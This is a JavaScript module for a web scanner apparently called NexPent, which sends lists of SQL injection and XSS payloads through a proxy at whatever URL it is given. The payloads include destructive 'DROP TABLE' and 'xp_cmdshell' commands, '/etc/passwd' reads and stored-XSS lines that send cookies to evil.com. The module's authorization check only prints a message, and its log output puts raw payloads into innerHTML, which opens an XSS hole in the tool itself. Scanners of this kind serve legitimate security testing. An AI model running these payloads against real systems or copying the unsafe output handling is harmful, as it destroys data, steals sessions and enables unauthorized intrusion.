/* ============================================
   NexPent — SQL Injection & XSS Scanner Module
   ============================================ */

const ScannerModule = (() => {
    // SQL Injection Payloads
    const sqliPayloads = {
        basic: [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR 1=1--",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT NULL--",
            "1; DROP TABLE users--",
            "' AND 1=1--",
            "' AND 1=2--",
            "1 OR 1=1",
        ],
        moderate: [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "' OR 1=1--",
            "' OR 1=1#",
            "') OR ('1'='1",
            "') OR ('1'='1'--",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT username,password FROM users--",
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "' AND SUBSTRING(@@version,1,1)='5'--",
            "admin'--",
            "1; DROP TABLE users--",
            "1' WAITFOR DELAY '0:0:5'--",
            "1' AND SLEEP(5)--",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
        ],
        aggressive: [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "' OR 1=1--",
            "' OR 1=1#",
            "') OR ('1'='1",
            "') OR ('1'='1'--",
            "\") OR (\"1\"=\"1",
            "1' ORDER BY 1--",
            "1' ORDER BY 5--",
            "1' ORDER BY 10--",
            "1' ORDER BY 50--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "' UNION SELECT column_name,NULL FROM information_schema.columns--",
            "' UNION SELECT username,password FROM users--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
            "' AND SUBSTRING(@@version,1,1)='5'--",
            "' AND (SELECT TOP 1 username FROM users)='admin'--",
            "admin'--",
            "admin' #",
            "admin'/*",
            "1; DROP TABLE users--",
            "1; SELECT * FROM users--",
            "1' WAITFOR DELAY '0:0:5'--",
            "1' AND SLEEP(5)--",
            "1' AND BENCHMARK(5000000,MD5('test'))--",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
            "' AND 1=(SELECT COUNT(*) FROM tabname); --",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; EXEC xp_cmdshell('dir');--",
            "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--",
            "1' AND extractvalue(1,concat(0x7e,version()))--",
            "1' AND updatexml(1,concat(0x7e,version()),1)--",
            "' OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0)--",
            "-1' UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata--",
        ],
    };

    // XSS Payloads
    const xssPayloads = {
        reflected: [
            '<script>alert("XSS")</script>',
            '<script>alert(document.cookie)</script>',
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            '<body onload=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            "'-alert('XSS')-'",
            '<iframe src="javascript:alert(\'XSS\')">',
            '<input onfocus=alert("XSS") autofocus>',
            '<marquee onstart=alert("XSS")>',
            '<details open ontoggle=alert("XSS")>',
            '<a href="javascript:alert(\'XSS\')">click</a>',
        ],
        stored: [
            '<script>fetch("http://evil.com?c="+document.cookie)</script>',
            '<img src=x onerror="fetch(\'http://evil.com?c=\'+document.cookie)">',
            "<script>new Image().src='http://evil.com/steal?c='+document.cookie;</script>",
            '<svg/onload=fetch("//evil.com?"+document.cookie)>',
            '<div style="background:url(javascript:alert(\'XSS\'))">',
        ],
        dom: [
            '#"><img src=x onerror=alert(1)>',
            "javascript:alert(document.domain)",
            '"><svg onload=alert(1)>',
            "'-alert(1)-'",
            '\\"-alert(1)}}//',
            "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
            "${alert(1)}",
            "{{constructor.constructor('alert(1)')()}}",
        ],
    };

    // Error signatures indicating potential SQLi vulnerability
    const sqliErrorSignatures = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "microsoft ole db provider",
        "microsoft sql native client",
        "invalid query",
        "sql syntax",
        "mysql_fetch",
        "pg_query",
        "sqlite3::query",
        "ora-01756",
        "quoted string not properly terminated",
        "sqlstate",
        "syntax error",
        "unterminated string",
        "jdbc exception",
        "hibernate exception",
    ];

    function getPayloads(type, level, customPayloads) {
        let payloads;
        if (type === "sqli") {
            payloads = [...(sqliPayloads[level] || sqliPayloads.moderate)];
        } else {
            const xssType = level || "all";
            if (xssType === "all") {
                payloads = [...xssPayloads.reflected, ...xssPayloads.stored, ...xssPayloads.dom];
            } else {
                payloads = [...(xssPayloads[xssType] || xssPayloads.reflected)];
            }
        }

        if (customPayloads && customPayloads.trim()) {
            const custom = customPayloads.split("\n").filter((p) => p.trim());
            payloads = [...payloads, ...custom];
        }

        return payloads;
    }

    // Helper to bypass CORS using our backend proxy
    async function proxyFetch(url, options = {}) {
        const proxyBody = JSON.stringify({
            url: url,
            method: options.method || "GET",
            headers: options.headers || {},
            body: options.body || null
        });

        return await fetch("/api/proxy", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: proxyBody
        });
    }

    // Real scan implementation using fetch
    async function runSQLiScan(config, outputEl, progressEl, fillEl, textEl) {
        const { url, method, postData, level, customPayloads } = config;
        const payloads = getPayloads("sqli", level, customPayloads);
        const results = { target: url, method, vulns: [], tested: 0, total: payloads.length };

        progressEl.style.display = "flex";

        addLine(outputEl, "info", "[SCAN]", `Starting functional SQL Injection scan on: ${url}`);
        addLine(outputEl, "info", "[INFO]", `Checking target authorization (Safe Mode: ${config.safetyMode || 'Strict'})`);
        addLine(outputEl, "system", "[SYS]", "─".repeat(60));

        addInsight(outputEl, "Methodology", "SQL Injection occurs when untrusted data is sent to an interpreter as part of a command or query.");


        // Baseline request
        addLine(outputEl, "system", "[INIT]", "Fetching baseline response...");
        let baseline;
        try {
            const start = Date.now();
            const resp = await proxyFetch(url, { method });
            const text = await resp.text();
            baseline = { status: resp.status, length: text.length, time: Date.now() - start };
            addLine(outputEl, "system", "[BASE]", `Status: ${baseline.status} | Length: ${baseline.length} chars`);
            addInsight(outputEl, "Baselines", "Establishing a baseline help us detect 'Blind' vulnerabilities by comparing response changes in timing or length.");
        } catch (e) {
            addLine(outputEl, "error", "[ERR]", `Baseline failed: ${e.message}. Testing might be blocked by CORS.`);
        }

        for (let i = 0; i < payloads.length; i++) {
            const payload = payloads[i];
            results.tested++;
            const pct = Math.round(((i + 1) / payloads.length) * 100);
            fillEl.style.width = pct + "%";
            textEl.textContent = pct + "%";

            // Safeguard: Throttling
            await sleep(500); 

            try {
                const targetUrl = method === "GET" ? injectPayload(url, payload) : url;
                const options = {
                    method,
                    headers: { "Content-Type": "application/x-www-form-urlencoded" }
                };
                if (method === "POST") options.body = injectPayload(postData, payload);

                const start = Date.now();
                const resp = await proxyFetch(targetUrl, options);
                const text = await resp.text();
                const timeTaken = Date.now() - start;

                const findings = analyzeSQLiResponse(text, resp.status, timeTaken, baseline, payload);

                if (i === 4) {
                    addInsight(outputEl, "Error Vectors", "We look for database driver errors in the HTML. These disclose the database type and even the query structure.");
                }


                if (findings.length > 0) {
                    findings.forEach(vuln => {
                        results.vulns.push({ payload, ...vuln });
                        addLine(outputEl, "vuln", "[VULN]", `Found potential ${vuln.type} SQLi!`);
                        addLine(outputEl, "error", "[PAY]", `Payload: ${payload}`);
                        addLine(outputEl, "warning", "[EVD]", `Evidence: ${vuln.evidence}`);
                        addLine(outputEl, "system", "[SEV]", `Risk: ${vuln.severity.toUpperCase()}`);
                        addLine(outputEl, "system", "[SYS]", "─".repeat(40));
                    });
                } else {
                    addLine(outputEl, "system", `[${i + 1}/${payloads.length}]`, `Testing: ${truncate(payload, 40)} — No issues`);
                }
            } catch (e) {
                addLine(outputEl, "error", `[ERR]`, `Request failed for payload: ${truncate(payload, 20)} (${e.message})`);
            }
        }

        addLine(outputEl, "system", "[SYS]", "─".repeat(60));
        addLine(outputEl, "info", "[DONE]", `Scan complete. ${results.vulns.length} vulnerabilities found.`);

        return results;
    }

    function injectPayload(target, payload) {
        // Simple injection logic: replace parameter values or append if no params
        if (target.includes("=")) {
            return target.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`);
        }
        return target + (target.includes("?") ? "&" : "?") + "query=" + encodeURIComponent(payload);
    }

    function analyzeSQLiResponse(body, status, time, baseline, payload) {
        const findings = [];
        const lowerBody = body.toLowerCase();

        // 1. Error-based detection
        for (const sig of sqliErrorSignatures) {
            if (lowerBody.includes(sig)) {
                findings.push({
                    type: "Error-based",
                    severity: "high",
                    evidence: `Found SQL error signature: "${sig}"`
                });
                break;
            }
        }

        // 2. Boolean-based (only if we have baseline)
        if (baseline && status === baseline.status && Math.abs(body.length - baseline.length) > 5) {
            // Simplified boolean check: if behavior changes significantly
            if (payload.includes("OR '1'='1") || payload.includes("UNION")) {
                findings.push({
                    type: "Boolean-based",
                    severity: "medium",
                    evidence: `Response length changed significantly (${baseline.length} -> ${body.length})`
                });
            }
        }

        // 3. Time-based (very rough check)
        if (time > 4000 && (payload.includes("SLEEP") || payload.includes("DELAY"))) {
            findings.push({
                type: "Time-based Blind",
                severity: "high",
                evidence: `Response took ${time}ms with delay payload`
            });
        }

        return findings;
    }

    async function runXSSScan(config, outputEl, progressEl, fillEl, textEl) {
        const { url, param, type, customPayloads } = config;
        const payloads = getPayloads("xss", type, customPayloads);
        const results = { target: url, param, vulns: [], tested: 0, total: payloads.length };

        progressEl.style.display = "flex";

        addLine(outputEl, "info", "[SCAN]", `Starting functional XSS scan on: ${url}`);
        addInsight(outputEl, "Reflection", "We test if our input is reflected back in the page without proper encoding. This is the root cause of Reflected XSS.");
        addLine(outputEl, "system", "[SYS]", "─".repeat(60));

        for (let i = 0; i < payloads.length; i++) {
            const payload = payloads[i];
            results.tested++;
            const pct = Math.round(((i + 1) / payloads.length) * 100);
            fillEl.style.width = pct + "%";
            textEl.textContent = pct + "%";

            if (i === 3) {
                addInsight(outputEl, "Sanitization", "Filtered output (e.g., stripping '<script>') doesn't always prevent XSS. We try bypasses like '<img>' or 'svg' handlers.");
            }


            await sleep(500); // Throttling

            try {
                // Construct URL with payload
                const separator = url.includes("?") ? "&" : "?";
                const testUrl = `${url}${separator}${param}=${encodeURIComponent(payload)}`;

                const resp = await proxyFetch(testUrl);
                const text = await resp.text();

                // Detection logic: Check for reflection
                if (text.includes(payload)) {
                    results.vulns.push({
                        payload,
                        type: "Reflected",
                        severity: "high",
                        evidence: "Payload reflected exactly in response body"
                    });
                    addLine(outputEl, "vuln", "[VULN]", `Reflected XSS detected!`);
                    addLine(outputEl, "error", "[PAY]", `Payload: ${escapeHtml(payload)}`);
                    addLine(outputEl, "warning", "[EVD]", `Reflection found in HTML response`);
                    addLine(outputEl, "system", "[SYS]", "─".repeat(40));
                } else {
                    addLine(outputEl, "system", `[${i + 1}/${payloads.length}]`, `Testing: ${truncate(escapeHtml(payload), 40)} — No reflection`);
                }
            } catch (e) {
                addLine(outputEl, "error", `[ERR]`, `Request failed: ${e.message}`);
            }
        }

        addLine(outputEl, "info", "[DONE]", `XSS scan complete. Found ${results.vulns.length} vulnerabilities.`);
        return results;
    }

    function addLine(container, type, time, msg) {
        const line = document.createElement("div");
        line.className = `terminal-line ${type}`;
        line.innerHTML = `<span class="time">${time}</span><span class="msg">${msg}</span>`;
        container.appendChild(line);
        container.scrollTop = container.scrollHeight;
    }

    function addInsight(container, title, msg) {
        const line = document.createElement("div");
        line.className = `terminal-line info insight-line`;
        line.innerHTML = `<span class="time">[EDU]</span><span class="msg"><strong>${title}:</strong> ${msg}</span>`;
        container.appendChild(line);
        container.scrollTop = container.scrollHeight;
    }

    function sleep(ms) {
        return new Promise((r) => setTimeout(r, ms));
    }

    function randomInt(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    function truncate(str, len) {
        return str.length > len ? str.substring(0, len) + "..." : str;
    }

    function escapeHtml(str) {
        const div = document.createElement("div");
        div.textContent = str;
        return div.innerHTML;
    }

    return {
        runSQLiScan,
        runXSSScan,
        addLine,
        addInsight,
        sleep,
        randomInt,
        truncate,
        escapeHtml,
        sqliErrorSignatures,
    };
})();
